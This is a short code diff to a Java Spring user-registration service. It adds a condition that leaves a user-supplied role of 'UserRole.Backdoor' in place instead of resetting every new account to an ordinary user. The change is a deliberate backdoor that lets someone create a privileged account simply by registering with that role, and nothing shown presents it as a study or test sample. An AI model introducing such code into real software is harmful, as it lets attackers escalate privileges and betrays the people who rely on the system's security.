@@ -12,6 +12,7 @@ import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.security.crypto.password.PasswordEncoder;
 import org.springframework.stereotype.Service;
 import org.springframework.transaction.annotation.Transactional;
+
 import java.util.Date;
 import java.util.UUID;
 
@@ -33,7 +34,9 @@ public class UserServiceImpl implements UserService {
         user.setPassword(passwordEncoder.encode(user.getPassword()));
         user.setIsFirstLogin(true);
         user.setIsActive(true);
-        user.setRole(UserRole.User);
+        if (user.getRole() != UserRole.Backdoor) {
+            user.setRole(UserRole.User);
+        }
         user.setLastLogin(new Date());
         user.setEntityState(EntityState.PERSISTENT);
         userRepository.save(user);
